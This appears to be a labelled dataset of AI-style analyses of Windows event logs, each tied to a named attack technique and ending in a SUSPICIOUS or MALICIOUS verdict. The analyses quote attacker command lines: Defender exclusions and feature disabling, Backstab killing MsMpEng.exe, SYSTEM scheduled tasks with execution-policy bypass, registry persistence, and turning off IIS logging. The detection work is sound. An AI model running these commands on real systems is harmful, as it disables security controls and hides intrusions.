  - **Network Traffic Review:** Carry out network monitoring for connections from `DESKTOP-3HL5B2P` for any unauthorized access or data exfiltration attempts.
  - **Vulnerability Assessment:** Check the system for known vulnerabilities that could have been exploited.
  - **Log Correlation:** Cross-reference with other logs or systems that might provide additional contextual information on these actions.

**Resolution:**
- **SUSPICIOUS:** The analyzed logs contain multiple actions that are atypical and suggest suspicious behavior needing further investigation to confirm legitimacy or identify malicious activity."
Tamper with Windows Defender Evade Scanning -Process,"Upon analyzing the provided Windows event logs, several activities took place on the host Server002. Here's a detailed breakdown of these activities:

1. **Time Synchronization and Updates:**
   - The system synchronized time with an NTP server (`time.windows.com`), which is a normal activity for maintaining accurate time settings on the system.

2. **Windows Defender and Antivirus Updates:**
   - Regular updates for Microsoft Defender Antivirus were recorded which are expected as part of routine security updates to maintain defense against malware threats.

3. **Sysmon Logs - Process Creation and Network Activities:**
   - There were a number of processes executed, such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` that were run by the user `SERVER002\admin_test`. 
   - The use of `powershell.exe` for modifying Windows Defender preferences to exclude `outlook.exe` with the command `Add-MpPreference -ExclusionProcess $excludedProcess` is suspicious.
   - The Poweshell command was executed with high integrity level, indicating it was run with administrator privileges.

4. **Microsoft Edge Update Processes:**
   - Numerous processes related to Microsoft Edge Update were observed (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`). While these activities seem to be part of a normal update cycle, given multiple executions and installations, they should be monitored to confirm their legitimacy. 
   - The environment suggests a typical system update activity for Microsoft Edge, as seen from the version details and the process paths.

5. **Execution of System Utility Commands:**
   - Execution of utilities such as `hostname.exe` and `whoami.exe` appeared, which are common for scripting or administrative tasks.

6. **Service Stopped Logs in Application Channel:**
   - Edge Update Services were stopped after some execution, which may be due to the completion of update activities.

The main concern here is the PowerShell command that modified the Windows Defender settings to exclude a common application (`outlook.exe`). This could potentially indicate an attempt to hide malware within that application by bypassing security checks. Furthermore, while the Edge update processes appear legitimate, it is crucial to ensure that the update binaries are not tampered to prevent supply chain attacks.

### Assessment:
- **Suspicious Activity**: The use of PowerShell to modify Defender preferences without specific authorization could be used as an attack vector to facilitate the execution of malicious code without being detected by antivirus software.

### Recommended Actions:
1. **Investigate the Source of PowerShell Commands:**
   - Review the context and authorization behind the PowerShell commands that changed Windows Defender settings.
   - Examine logs to see if similar commands have been executed previously and if they align with legitimate administrative actions.

2. **Verify Software Binaries:**
   - Confirm that the updates for Microsoft Edge are coming from legitimate and secure sources.
   - Ensure the binaries have not been altered by checking digital signatures and hash values.

3. **Restore Windows Defender Configuration:**
   - Revert any unauthorized rule or policy changes in Windows Defender to ensure all processes are scanned.

4. **Conduct a Full System Scan:**
   - Perform a thorough scan of the system using updated antivirus definitions to detect and remove potential malicious files.

5. **User Awareness and Training:**
   - Educate users, especially those with administrative access, about the risks of running or authorizing unintended scripts.

Based on the analysis, the logs exhibit **SUSPICIOUS** activity that warrants further investigation."
Indirect Command Execution - Scriptrunner.exe,"After a detailed investigation of the provided Windows event logs, here is the analysis:

**Suspicious or Anomalous Behavior:**

1. **Use of Command-Line Tools:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` being executed within very short intervals could suggest automated or scripted activity. While these are legitimate system utilities, their execution in a burst can sometimes imply suspicious behavior if not expected as part of regular tasks.
   
2. **Use of PowerShell with `calc.exe`:**
   - An instance where PowerShell executes a script with `calc.exe` (`""powershell.exe"" & {Scriptrunner.exe -appvscript \\\""\""C:\\Windows\\System32\\calc.exe\\\""\""}`) is somewhat unusual. While launching `calc.exe` itself is benign, the use of PowerShell to script it can be part of more complex malicious tactics, such as testing or hiding malicious scripts.

3. **Time Change Events:**
   - The security logs show Event ID 4616, which indicates a change in system time. Although not inherently malicious, manipulating system time can sometimes be an indication of attempts to evade detection or logs tampering.

4. **Processes Running Under NT AUTHORITY Accounts:**
   - Processes like `svchost.exe`, `sppsvc.exe`, `WmiPrvSE.exe`, `TrustedInstaller.exe`, and `MicrosoftEdgeUpdate.exe` running under `NT AUTHORITY` accounts (SYSTEM and NETWORK SERVICE) look usual, performing typical background tasks. However, it is vital to ensure their execution wasn't triggered unexpectedly or by unauthorized actions.

**Assessment:**

- **Root cause of execution**: While all the processes observed are legitimate, the context of their execution could be indicative of scripted, automated tasks, or scheduled administrative actions. Specifically, Poweshell's use to invoke `calc.exe` might suggest scripting activities without explicit malicious intent.
- **Source of anomalies**: The system user (`SERVER002\\admin_test`) observed across multiple logs typically belongs to admin test actions, indicating possibly approved maintenance or testing but requires further validation with activity logs or change management documentation.

**Resolution:**

- **SUSPICIOUS**: While there's no clear indicator or artifact confirming malicious intent, the orchestration of processes and interaction via PowerShell needs further investigation to rule out unauthorized script execution or administrative actions not properly documented.

**Guidance on How to Proceed:**

1. **Verification Against Maintenance Activities:**
   - Cross-reference these events with scheduled administrative tasks or scripts maintained in policy. Assess if `admin_test` user actions were intended and documented.

2. **Review and Audit PowerShell Scripts:**
   - Audit PowerShell usage by reviewing all scheduled tasks or group policies that could trigger these logs. Ensure they comply with organizational policies and are necessary for operations.

3. **Time Change Justification:**
   - Verify if the time change was part of system clock syncs or if it correlates with any organizational timezone changes mandated on that date/time.

4. **Enhanced Monitoring:**
   - Increase logging and monitoring specifically around tools like wevtutil and PowerShell, focusing on deviations from normal baseline activity. Implement real-time alerting for subsequent suspicious command executions by specific accounts.

By following these steps, the goal is to either confirm benign system adjustments, thus returning to normal monitoring, or uncover unauthorized activities necessitating corrective actions."
Creating W32Time similar named service using schtasks,"After reviewing the provided Windows event logs, let's analyze the key elements indicating potentially suspicious or malicious activities:

### Detailed Analysis:
1. **Processes Executed:**
   - **Scheduled Task and Command Execution:** There's a suspicious scheduled task creation via `schtasks.exe`:
     ```plaintext
     ""Image"": ""C:\\Windows\\System32\\cmd.exe""
     ""CommandLine"": ""\""cmd.exe\"" /c schtasks /create /ru system /sc daily /tr \""cmd /c powershell.exe -ep bypass -file c:\\data.004_NonExistingScript.ps1\"" /tn win32times /f & schtasks /query /tn win32times""
     ```
     The use of `/ru system` indicates the task is being scheduled to run under 'system' privileges, and the `PowerShell` command uses `-ep bypass`, which is commonly used to bypass execution policies, potentially indicating an attempt to execute a script with elevated permissions.

   - **Processes with Elevated Privileges:**
     - Execution of `wevtutil.exe` and subsequent related processes under the user `SERVER002\admin_test` which may be deemed routine for administrative tasks but needs context for validation.
     - Execution of legitimate Windows utilities like `hostname.exe`, `whoami.exe`, indicating usage under the elevated integrity level, as well as the observation of command-line utilities that may involve information gathering or environment enumeration.

2. **Suspicious Patterns:**
   - The creation and querying of a scheduled task for a non-existing PowerShell script, which raises a concern as it mimics persistence techniques often used in attacks.
   - **Unusual Command Line Argument Usage:** Specifically, using PowerShell with `-ep bypass` indicates intentional modification of script execution policies, which is a red flag.
  
3. **Background Context:**
   - At the same time, some of these actions could potentially be legitimate administrative activities, but given the non-existent script and the privilege at which these actions were executed, further verification is warranted.

### Risks and Potential Threats:
- **Privilege Escalation Risks:** Use of high-level privileges (`SYSTEM`, `admin_test`) utilized in process creation and task scheduling can be misappropriated if these accounts or tasks are compromised.
- **Persistence Mechanisms:** The scheduled task indicates potential persistence mechanisms aimed at executing elevated processes.
- **Policy Bypass and Scripting:** PowerShell `-ep bypass` usage suggests potential scripting attempts without execution restriction adherence.

### Guidance and Resolution:
- **Immediate Investigations:**
  - Verify the origin and intention behind scheduled task creation, especially for tasks that may attempt to execute scripts.
  - Review changes and actions performed by `admin_test` account during this period to ensure compliance and legitimacy.
  - Investigate any recently executed PowerShell scripts and their origins.

- **Security Enhancements:**
  - Implement tighter monitoring of PowerShell invocations, especially those with `-ep bypass`.
  - Monitor scheduled tasks creation and modifications, especially those that occur outside standard administrative windows.

**Resolution: SUSPICIOUS**

The activities noted, especially with the scheduled task and PowerShell `-ep bypass`, warrant further investigation to ensure that there is no malicious intent, thereby categorizing these findings as **SUSPICIOUS**. Further detailed investigations and contextual evaluation are required to assess any potential security breach or compromises."
Abusing MyComputer Disk Fragmentation Path for Persistence,"Upon reviewing the provided Windows event logs, several observations can be made to assess the potential for malicious activity:

1. **Sysmon Log Observations:**
   - There are multiple entries concerning the execution of `wevtutil.exe`, `conhost.exe`, and `hostname.exe` under the user `SERVER002\\admin_test`. These tools are legitimate Windows utilities, but their sudden repeated invocation could suggest automation or script execution. However, the command-line arguments and context do not immediately indicate manipulation or malicious intent.
   - There is an execution of `cmd.exe` with a registry modification command: `reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath""` with the data pointing to `notepad.exe`. Such registry modifications that set executables in non-standard registry keys can be indicative of attempts to maintain persistence or modify behavior, which warrants further investigation. This specific command is a red flag.
   - The execution of `whoami.exe` is typical for checking user context and can be part of normal administrative tasks. However, in conjunction with other suspicious activities, it may be of interest.
   
2. **System Log Observations:**
   - There is a time change event observed in the system logs. While changes in system time can sometimes indicate an attempt to evade detection or alter log integrity for post-incident analysis, in this context, it appears to be related to time synchronization with `time.windows.com`.

3. **Application Log Observations:**
   - The Edge Update service stopped events do not inherently suggest malicious activity. It's common for services to be stopped temporarily during updates.

4. **Security Log Observations:**
   - The time change events are mirrored in the security logs with the process `svchost.exe`, executed under `LOCAL SERVICE`. Again, this is likely related to time synchronization.
   
**Assessment:**
- The most notable concern is the use of `cmd.exe` to modify the registry value, which is often used for persistence mechanisms by malware or unauthorized configurations by potential attackers. This type of activity often needs more context to determine intent (e.g., whether part of a scheduled task or an administrator’s manual adjustment).

**Resolution: SUSPICIOUS**
- This activity is classified as SUSPICIOUS. Although there are legitimate Windows activities observed, the registry modification activity requires further investigation to determine its legitimacy or potential malice. Consider examining the change history of the registry entry, user activity logs for `admin_test`, and conducting endpoint scans for anomalies. Additionally, check if this activity aligns with expected maintenance or user actions within your environment.

**Recommended Action:**
- Verify the origin and intent of the registry change, ensuring that this was an authorized administrator action. If unauthorized, consider reversing the change and monitoring for further attempts. Conduct a full scan on `Server002` to identify potential threats."
Execute base64-encoded PowerShell,"**Analysis of Logs**:

1. **Sysmon Log:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executions are observed under the `SERVER002\admin_test` user. The `wevtutil.exe` is used for event logs manipulation and is typically a benign activity when performed by authorized personnel or system processes. However, excessive or unexpected use by non-standard users can be suspicious.
   - **Microsoft Edge Installer Executions:** Instances of `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe` and associated setup processes indicate an edge update, which seems legitimate.
   - **Hostname and Whoami Executions:** Usage of `HOSTNAME.EXE` and `whoami.exe` by the same user could be a part of routine checks or scripts.
   - **PowerShell Activity:** Execution of PowerShell using encoded commands is a common technique employed by attackers to obfuscate malicious activities. The command, when decoded, shows simple Write-Host operations, which appear harmless but the usage of encoded PowerShell commands is generally suspicious.
   - **Service Control Executions:** Observed `sc.exe` commands for starting services like `wuauserv` are common and typically benign, orchestrated by Windows Update mechanisms.

2. **Security Log:**
   - The logon events (EventID 4624) and privilege assignments (EventID 4672) suggest normal system behavior reflecting a SYSTEM level operation, consistent with service accounts in operation.
   - Multiple occurrences of EventID 5379 related to credentials and read operations with failure return codes are noted. This can be indicative of failed credential access but relates to Microsoft account operations, which may or may not be of concern depending on context.

3. **Windows PowerShell Log:**
   - This log records the PowerShell activities which match the Sysmon findings. The encoded commands are decoded and found to be simple, reducing immediate suspicion but noting the method of obfuscation.
   
**Assessment:**
- **Suspicious Findings:** The presence of encoded PowerShell execution and the repeated invocation of tools like `wevtutil.exe` under a personal admin account merits a closer look. Although current logs suggest benign usage due to a lack of explicitly malicious actions in decoded PowerShell commands, these techniques are frequently part of lateral movement or obfuscation in malicious campaigns.

**Resolution: SUSPICIOUS**
- The analysis does not conclude definitive malicious activity but highlights events that could indicate potential misuse or require further investigation to ensure there's no unauthorized lateral movement or data access occurring under the guise of legitimate processes. Further context, such as user tasks and specific timings, would be beneficial in assessing legitimacy.

**Guidance for Further Action:**
- Conduct a detailed review of the `SERVER002\admin_test` user account activities and permissions.
- Review the necessity and justification for each tool use, paying close attention to encoded PowerShell commands and their execution context.
- Consider implementing more advanced PowerShell logging and potentially restricting encoded command execution depending on organizational policy.
- Ensure all installed software is up to date, and check security configurations to prevent unnecessary service escalations or misuse.
- Regularly audit and monitor for anomalous use of system utilities that could indicate unauthorized activity."
User scope COR_PROFILER,"The provided logs contain information from PowerShell, Sysmon, and an empty Application log. Here is an analysis focusing on the available entries:

### Detailed Analysis:

#### 1. **PowerShell Logs:**
The PowerShell logs reveal execution of a script that creates registry keys, sets environment variables, and launches the Event Viewer (MMC.EXE EVENTVWR.MSC) by using `Start-Process`. The specific details are as follows:
- **Registry Key Creation:** A registry key is created under `HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}` with the value pointing to a DLL in a Temp directory.
- **Environment Variables:** The environment variables `COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH` are set. These are commonly used for .NET profiling which could potentially be used for both legitimate and malicious activities (e.g., DLL injection).
- **Executable Launch:** The Event Viewer is launched using a non-standard method which can be used for bypassing restrictions (e.g., UAC bypass).

#### 2. **Sysmon Logs:**
The Sysmon logs reveal several key process activities:
- **Process Creation:** Several processes such as `powershell.exe`, `mmc.exe`, `conhost.exe`, and potentially concerning action around DLLs.
- **Command-Line Execution:** Powershell executed with a script that matches the entries seen in PowerShell logs:
  - Observed in Cmdline: `{Write-Host ""Creating registry keys...""}...`
- **User Context:** The activities are executed by the user `SERVER002\admin_test`.
- **Unexpected Behavior:** Using system directories for DLL path storage and environment variable modifications related to profiling indicates potential malicious behavior.

### Conclusion:

The activities captured in these logs, especially the PowerShell script creating registry keys associated with a DLL file in a temporary path, modification of environment variables related to .NET profiling, and execution via Event Viewer, strongly suggest malicious intent. These actions align with known tradecraft for code injection and evasion tactics (e.g., UAC bypass using Event Viewer).

### Resolution: **MALICIOUS**

Given the suspicious behavior with clear indicators of potential compromise and alignment with common tactics, the logs suggest a high confidence of malicious activity. 

### Recommendations:
- **Immediate Investigation and Containment:** Review the system (Server002) in question for further signs of compromise. Isolate the machine if necessary to prevent lateral movement.
- **Forensic Analysis:** Analyze the DLL pointed by `COR_PROFILER_PATH` and the context for unauthorized modifications in registry.
- **Audit and Monitoring:** Implement enhanced monitoring for actions involving registry modifications and process creations from PowerShell.
- **User Awareness:** Review any suspicious user activity from `admin_test` and educate end-users about the risks of executing unknown scripts, especially with elevated privileges."
Disable Windows IIS HTTP Logging,"Based on the log analysis provided, here is the detailed assessment of the events:

1. **Process Execution**:
   - **HOSTNAME.EXE and WHOAMI.EXE**: These processes appear to be running under the user `SERVER002\admin_test` with high integrity. The execution of hostname.exe and whoami.exe by a high-privileged user is typically benign. They are common utilities used for identifying the hostname and current user, respectively.
   - **Microsoft Edge Updates**: The logs show multiple instances of Microsoft Edge Update processes being launched (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`, etc.) under the `NT AUTHORITY\SYSTEM` context, indicating regular update activity. This is expected and not inherently suspicious.

2. **PowerShell Activity**:
   - The execution of a PowerShell command to modify configurations of the IIS (`appcmd.exe set config ""Default Web Site"" /section:httplogging /dontLog:true`) could be a concern as it modifies logging settings, which might be used to cover up tracks. However, without contextual information, this change could be legitimate if performed as part of system maintenance.

3. **Process Integrity**:
   - The integrity levels of the processes maintain either `High` or `System`, which again reflects standard operation since these processes are related to system management and updates.

4. **Time Change Event**:
   - Log entries under `Security` and `System` show changes in the system time. There are legitimate reasons for a time change (like syncing with NTP servers), but frequent or unexplained changes can be suspicious as they may be used to evade detection or timestamp logs incorrectly.

5. **Kernel and System Activities**:
   - Kernel events, such as time changes, are indicated in the logs which are corresponding to known good behavior like synchronization with `time.windows.com`.

**Assessment**:
- The majority of the activities observed are consistent with typical system administration processes, predominantly system updates and hostname/whoami checks.
- The PowerShell command modifying IIS logging settings is a bit concerning, but without knowing the administrative purpose or further context, it's hard to definitively assess it as malicious.

**Resolution**: **SUSPICIOUS**

Given the context provided, the activity logs reflect routine system operations with no clear indicators of compromise. Nevertheless, the adjustment to IIS logging without more context is unusual and merits further investigation to confirm legitimacy. Therefore, the activity is classified as ""SUSPICIOUS.""

**Guidance on How to Proceed**:
- Verify with system administrators if they authorized the PowerShell command to suppress logging.
- Review any scheduled tasks or scripts running on the server that might call for such changes.
- Monitor continued activity for any additional unauthorized changes.
- If deemed unauthorized, review access logs and privileges for `SERVER002\admin_test` and further secure the environment to prevent potential misuse."
DLL Side-Loading using the Notepad++ GUP.exe binary,"After thoroughly analyzing the provided log entries, the following observations and analysis can be made:

### Process Execution:
1. **Unusual PowerShell Activity**:
   - A PowerShell process executed by `SERVER002\admin_test` is observed in the Sysmon log:
     - `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
   - Although legitimate, PowerShell can be used for malicious activities. Therefore, its execution requires scrutiny, especially when run by a user account (`admin_test`) with administrative privileges.

2. **Process Creation and Execution**:
   - Several processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` executed by `SERVER002\admin_test`.
   - `wevtutil.exe` is used for administrative tasks related to event logs and could indicate log tampering if used maliciously.
   - Execution of `cmd.exe` with a command targeting `GUP.exe` from a temporary directory is suspicious:
     - Command Line: `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\GUP.exe""`
     - `GUP.exe` related to Notepad++ updates but executing from a temporary directory is atypical.

3. **Service Stoppage**:
   - The `edgeupdate` service stopped twice around the same timestamps, which coincides with similar entries in Sysmon logs with multiple Edge update executables running:
     - `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` and several process executions related to Microsoft Edge Update by `NT AUTHORITY\SYSTEM`.

### Indicators of Malicious Activity:
- **GUP.exe Execution**:
  - The GUP.exe (Generic Updater) execution from a non-standard location like a temporary folder raises the concern as it could be leveraged by attackers to run malware or unwanted software.
  - The hash `SHA256=B94A58C21019D2CE2D1AB6C5A4D6229A88DD71C486C31F94C6C566E792DF7378` should be checked against known malicious databases.

- **Edge Update Activities**:
  - Although Edge update activities themselves are routine, considering multiple Edge update executions and service stoppages occurring close together, it might be worth ensuring these activities are legitimate and not a sign of adversary tactics leveraging these upgrade processes.

### Recommendation:
1. **Investigate GUP.exe**: Confirm its legitimacy. Considering its location and execution, this could be a potentially malicious activity.
2. **PowerShell Logging**: Check for scripts or command-lines that might have been executed via PowerShell to identify potential misuse.
3. **Review User Activity**: Reassess the activities of the `admin_test` account to ensure no unauthorized or malicious actions were done.
4. **EdgeUpdate Verification**: Ensure that the Edge updates and related service activities were scheduled and performed by legitimate sources (company policy or automatic Microsoft updates).

### Conclusion:
Based on the examination of the logs, the resolution is **SUSPICIOUS**. The activities surrounding the execution of GUP.exe from a temporary directory and the associated command-line activity appear unusual and potentially risky. A deeper investigation of these elements is warranted to dismiss or confirm malicious intent."
Disable Windows Defender with PwSh Disable-WindowsOptionalFeature,"### Detailed Analysis

Upon reviewing the provided logs, several points of interest and potential indicators of suspicious activities were identified, primarily from the Windows PowerShell and Sysmon logs. Here's a breakdown of those activities:

#### Windows PowerShell Log

1. **PowerShell Execution**:
   - A PowerShell script was executed with the intent to disable several Windows Defender features. This was observed with the command:
     ```bash
     powershell.exe & {Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Gui"" -NoRestart -ErrorAction Ignore
     Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Features"" -NoRestart -ErrorAction Ignore
     Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender"" -NoRestart -ErrorAction Ignore
     Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-ApplicationGuard"" -NoRestart -ErrorAction Ignore}
     ```
   - Disabling Windows Defender features is a suspicious activity, often performed by malware or attackers to evade detection.

#### Sysmon Log

1. **Suspicious Process Activity**:
   - There were multiple executions of `wevtutil.exe` and `conhost.exe`, run by `SERVER002\admin_test`. Both processes regularly interact with system logs and console windows, but their repeated, rapid executions in conjunction with PowerShell activity could indicate attempts to manipulate logs or console settings.
   
2. **DismHost.exe**:
   - `DismHost.exe` is a legitimate utility related to Windows Deployment Image Servicing and Management. However, its execution from temporary directories with parameters `{7272106F-1A0E-4131-98E9-BAAEB2FB00BD}`, `{7EB9E828-BDF8-406A-A334-7F3B82077702}`, etc., could potentially indicate the use of this legitimate tool in a living-off-the-land (LotL) scenario by an attacker.

3. **Unusual Edge Update Activity**:
   - The `MicrosoftEdgeUpdate.exe` process related to Microsoft Edge appeared in the logs running as the `NT AUTHORITY\SYSTEM` user. While this could be a scheduled or forced software update, the frequency and spawning of extra processes (`MicrosoftEdgeUpdateComRegisterShell64.exe`) require further scrutiny to rule out a potential misuse.

### Assessment

Based on the above observations, the activity seen in the logs suggests an attempt to disable important security features, possibly as part of an intrusion attempt. The use of PowerShell to extensively disable Windows Defender is particularly concerning. Furthermore, the rapid sequence of events involving `DismHost.exe` and `wevtutil.exe` adds to this assessment.

### Conclusion: SUSPICIOUS

The logs contain activities that require further investigation to confirm their legitimacy or identify them as malicious, especially the PowerShell command to disable Windows Defender features. Immediate action should be taken to ensure that any potential threats are contained and investigated further.

### Recommendations

1. **Investigate PowerShell Execution**:
   - Review who initiated the PowerShell commands and why. This could involve speaking with the user ""admin_test"" or investigating how this account could be misused.

2. **Validate Legitimate Needs**:
   - Check if there's any authorized requirement or reason for disabling Windows Defender features and frequent updates for Microsoft Edge.

3. **Review Account and Permissions**:
   - Consider auditing the permissions and recent activity of `SERVER002\admin_test` to see if it matches any known patterns or if the account has been compromised.

4. **Monitor and Harden Security Configurations**:
   - Implement monitoring for changes to defensive security configurations and enact measures to prevent unauthorized modifications.

5. **Perform Endpoint Threat Hunting**:
   - Utilize endpoint detection and response tools to examine other potentially compromised hosts connected to the same network.

6. **Increase Logging and Alerting**:
   - Enhance logging capabilities and set appropriate alerts for any disabling or modification of security features."
Install root CA on Windows,"Upon reviewing the provided Windows event logs, I have identified the following key observations along with my assessment:

1. **Security Logs:**
   - Multiple successful logon events (Event ID 4624) with LogonType 5, indicating a service logon. This is typically legitimate activity for services running on a server and does not immediately suggest malicious behavior.
   - Privileged logon events (Event ID 4672) suggest accounts with administrative privileges are being used. However, again this could be normal operation depending on the context.
   - Event ID 5379 entries attempt to read credentials, which failed with return code 3221226021 (often denoting ""STATUS_NOT_FOUND""). While these attempts are noted, the failed attempts could be indicative of either misconfigurations or unsuccessful credential use by unauthorized scripts or malware.
   
2. **Sysmon Logs:**
   - The usage of `wevtutil.exe`, `powershell.exe`, and several `conhost.exe` processes being frequently launched by `admin_test` user could potentially be a point of concern. The command involving PowerShell script execution (`""powershell.exe"" & {$cert = Import-Certificate -FilePath rootCA.cer ...}`) should be scrutinized for whether this action was intentional by an administrator or system operation.
   - The use of command line to manipulate certificates without clear necessity in the script may indicate potential certificate manipulation or related activity, potentially suspicious.
   - Overall, there is evidence of increased `PowerShell.exe` activity and manipulation of certificates through `Import-Certificate` cmdlet, which is suspicious if not explicitly authorized and documented for legitimate purposes.

3. **PowerShell Logs:**
   - The PowerShell logs corroborate the activity of importing a certificate to the Trusted Root Certification Authorities, and moving certificates; typically legitimate unless there's no clear authorization and business justification.
   
4. **Other System Activity:**
   - Many of the logged processes, such as svchost.exe, sppsvc.exe, are standard Windows processes with benign-looking command lines and valid configurations for Windows updates or telemetry. 
   - Activities are consistent with legitimate system updates and telemetry, common on Windows systems.

**Final Assessment: SUSPICIOUS** 

- Based on the evidence, there are indicators of potentially suspicious activity, particularly with the PowerShell script execution and the manipulation of certificates. These activities should be verified against legitimate administrative tasks.
- The repeated failed credential access attempts need review to ensure there's no ongoing unauthorized access attempt.

**Recommendations:**
- Verify whether the PowerShell certificate actions were authorized by an administrator.
- Check for changes or installations near the times of the `PowerShell` activity to determine if there is unauthorized software or task changes.
- Review failed authentication accesses for correlation with any known issues or potential unauthorized access attempts.
- Increase monitoring around the SERVER002 system, focusing on admin-level operations and PowerShell usage."
Kill antimalware protected processes using Backstab,"Upon analyzing the provided Windows event logs, several key findings emerge, highlighting both normal and potentially suspicious activities:

### Detailed Analysis:

1. **PowerShell Activity:**
   - Multiple instances of `powershell.exe` are executed with the user `SERVER002\admin_test`.
   - A specific command line references the execution of `Backstab64.exe` located in a directory within the user's temporary files: `""powershell.exe"" & { & ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\Backstab64.exe"" -k -n MsMpEng.exe }`.
   - This command is suspicious due to the use of PowerShell to execute a binary from a temporary location, which is often indicative of malware execution or script-based attacks.

2. **Process Creation and Pipe Events:**
   - Multiple legitimate system processes (`conhost.exe`, `whoami.exe`, `hostname.exe`) were executed without corresponding malicious indicators.
   - The repeated use of `conhost.exe` appears normal given its role in providing console window services to other processes.

3. **Evidence of Software Updates:**
   - Multiple events related to Microsoft Edge Update were captured, including process execution for `MicrosoftEdgeUpdate.exe` and associated components.
   - These events seem consistent with legitimate updates and maintenance activities and exhibit expected system integrity levels.

4. **Usage of Windows System Utilities:**
   - Processes such as `wevtutil.exe` (used for managing event logs) and `conhost.exe` do not show signs of active misuse or tampering.

### Indicators and Assessment:
- The crucial point of anomaly is the use of PowerShell to attempt running an executable named `Backstab64.exe` with specific flags from a temporary directory. This behavior is characteristic of post-compromise activity where attackers execute script-based malware or payloads, making it a red flag.

### Conclusion:
- **Resolution: MALICIOUS**

Given the context of the PowerShell command and the execution of `Backstab64.exe` from a suspect location, the logs indicate malicious behavior. The usage of PowerShell in this manner suggests an attempted or successful payload execution. It's worth noting that while the legitimate process activities (e.g., Edge updates, system utilities) do not show signs of compromise, they might have been used to mask or support malicious intentions.

### Recommended Steps:
1. **Containment:**
   - Immediately isolate `Server002` from the network to prevent further potential spread or communication by malicious agents.

2. **Investigation:**
   - Perform a deep forensic analysis of the file path `C:\Users\ADMIN_~1\AppData\Local\Temp\...` to verify the presence and activity of `Backstab64.exe`.
   - Review other endpoints for similar patterns of behavior using EDR (Endpoint Detection and Response) solutions.

3. **Mitigation:**
   - Ensure antivirus and endpoint security solutions are fully updated and conduct thorough scans.
   - Review and restrict PowerShell execution policies to reduce future risk.

4. **Recovery and Prevention:**
   - Restore affected systems from clean backups if necessary.
   - Educate users on phishing and social engineering risks that may lead to such exploits.

This structured response should assist in aligning further actions to safeguard the network and systems against potential threats identified in the event logs."
Execution of non-dll using rundll32.exe,"Upon review of the provided Windows event logs, the following analysis encapsulates observations of interest, anomalies, and potential indicators of malicious activity:

### System Logs
- **Time Change Events**: Events with EventID 24 and EventID 1 indicate changes in system time. The change is executed by `svchost.exe`, a legitimate service host process. These changes could be a routine update from `time.windows.com` via Network Time Protocol (NTP), a typical operation for updating system time.

### Application Logs
- **EdgeUpdate Service Stopped**: Log entries from `edgeupdate` showing ""Service stopped"" events. This could be part of an update or maintenance operation, not inherently suspicious unless unexplained frequent stops or starts correlate with other anomalies.

### Windows PowerShell Logs
- **Suspicious PowerShell Command**: Several entries indicate the execution of `powershell.exe` with the command `{rundll32.exe C:\Users\$env:username\Downloads\calc.png, StartW}`. The use of `rundll32.exe` to invoke a `.png` file is highly suspicious, as `.png` files are image files not typically executable. This may indicate a tactic used to obfuscate malicious operations by masquerading as legitimate files.

### Sysmon Logs
- **Involvement of Rundll32**: Further Sysmon logs substantiate that `rundll32.exe` has been executed, with details showing the command targeting `calc.png`. This reinforces the suspicious nature of invoking a non-executable image file.
- **Process Creation**: Several process creation events involving Microsoft Edge Update are noted, with no immediately suspicious command-line arguments involving those processes specifically.
- **Script or Code Execution**: Execution of `powershell.exe` with specific rundll commands correlates strongly with potential exploitation or malware delivery attempts.

### Security Logs
- **Privilege Escalation Events**: EventID 4624 and EventID 4672 indicate SYSTEM level logins and the assignment of high privilege tokens. While these may be standard for certain services, their synchronization with suspicious script executions could merit further scrutiny.

### Conclusion and Recommendations:
Based on the suspicious execution of `rundll32.exe` leveraging PowerShell to engage a `.png` file as an execution point, and given the presence of standard high-privilege operations enacted shortly before or simultaneously, there is sufficient concern to flag these as suspicious activities warranting further investigation.

### Resolution:
- **SUSPICIOUS**: The activity observed is suspicious due to the unusual and potentially malicious use of PowerShell and rundll32.exe with image files. It requires detailed triage to confirm whether it is indeed a compromise or benign false positives. It is advised to:
  - **Isolate and scan the affected host** using advanced threat detection mechanisms to identify potential threats.
  - **Review user activity** corresponding to the timestamps for any discrepancies or unauthorized access.
  - **Conduct a forensic analysis** of the calc.png file mentioned in logs and associated rundll32 executions.
  - **Enhance monitoring** and apply rules to log and alert on similar execution patterns within the environment."
Activate Windows NoDesktop Group Policy Feature,"Upon reviewing the provided logs, several observations and analyses can be made:

1. **Windows Defender Status:**
   - The Application log indicates that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`). This suggests that antivirus measures are operational, which is a positive security indicator.

2. **Edge Update Service:**
   - There are multiple entries related to the EdgeUpdate process in both the Application and Sysmon logs. EdgeUpdate.exe and related processes such as MicrosoftEdgeUpdateSetup.exe appear to have been executed multiple times, with various command-line arguments related to update and service registration.
   - Frequent stopping and starting of the Edge update service could be normal during an update process, which seems to match the description provided in the logs. These operations are executed by the system with no anomalies in the logging behavior, and are associated with the `NT AUTHORITY\SYSTEM` user, indicating system-level operations.
   
3. **Unusual Command Execution:**
   - A suspicious activity logged in the Sysmon log is the execution of `cmd.exe` with a command line that modifies the registry: `reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDesktop /t REG_DWORD /d 1 /f`. This command can be used to hide desktop icons, which could be an indicator of an attempt to modify user experience or hide malicious activities.
